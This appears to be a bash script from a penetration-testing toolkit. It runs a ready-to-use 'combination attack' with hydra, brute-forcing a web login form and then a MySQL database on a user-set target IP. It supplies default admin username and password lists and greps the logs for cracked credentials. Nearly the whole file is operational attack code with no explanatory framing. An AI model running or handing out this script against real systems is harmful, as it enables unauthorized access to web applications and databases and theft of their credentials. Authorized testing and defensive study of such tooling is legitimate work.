#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# COMBINATION: WEB + DATABASE ATTACK
# Tests web application login, then attacks backend database
# ═══════════════════════════════════════════════════════════════════

TARGET="192.168.1.100"  # <-- CHANGE THIS TO YOUR TARGET

# ═══════════════════════════════════════════════════════════════════

set -euo pipefail  # Enterprise error handling

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
WEB_PORT=80
DB_PORT=3306
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/combo_web_db_${TARGET//[.:\/]/_}_$(date +%Y%m%d_%H%M%S).log"

echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  COMBINATION ATTACK: WEB + DATABASE" | tee -a "$LOG_FILE"
echo "  Target: $TARGET" | tee -a "$LOG_FILE"
echo "  Scenario: Web Application with MySQL Backend" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Phase 1: Web Application Attack
echo "━━━ Phase 1: Web Application Attack ━━━" | tee -a "$LOG_FILE"
echo "[*] Testing web admin panel on $TARGET:$WEB_PORT..." | tee -a "$LOG_FILE"

if command -v hydra &>/dev/null; then
    USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
    PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"
    
    [ ! -f "$USERLIST" ] && echo -e "admin\nroot\nwebmaster" > "$USERLIST"
    [ ! -f "$PASSLIST" ] && echo -e "admin\npassword\nadmin123" > "$PASSLIST"
    
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -f \
        http-post-form://"$TARGET:$WEB_PORT/login.php:username=^USER^&password=^PASS^:F=incorrect" \
        2>&1 | tee -a "$LOG_FILE" || echo "[!] Web attack completed with no results" | tee -a "$LOG_FILE"
else
    echo "[!] Hydra not found, skipping web attack" | tee -a "$LOG_FILE"
fi

echo "" | tee -a "$LOG_FILE"

# Phase 2: Database Attack
echo "━━━ Phase 2: MySQL Database Attack ━━━" | tee -a "$LOG_FILE"
echo "[*] Testing MySQL database on $TARGET:$DB_PORT..." | tee -a "$LOG_FILE"

if command -v hydra &>/dev/null; then
    DB_USERS="$PROJECT_ROOT/config/admin_usernames.txt"
    DB_PASS="$PROJECT_ROOT/config/admin_passwords.txt"
    
    hydra -L "$DB_USERS" -P "$DB_PASS" -t 4 -f \
        mysql://"$TARGET:$DB_PORT" \
        2>&1 | tee -a "$LOG_FILE" || echo "[!] Database attack completed with no results" | tee -a "$LOG_FILE"
else
    echo "[!] Hydra not found, skipping database attack" | tee -a "$LOG_FILE"
fi

echo "" | tee -a "$LOG_FILE"

# Summary
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  COMBINATION ATTACK COMPLETE" | tee -a "$LOG_FILE"
echo "  Log file: $LOG_FILE" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"

# Check for successful credentials
if grep -q "login:" "$LOG_FILE"; then
    echo "" | tee -a "$LOG_FILE"
    echo "[+] CREDENTIALS FOUND:" | tee -a "$LOG_FILE"
    grep "login:" "$LOG_FILE" | tee -a "$LOG_FILE"
fi

exit 0
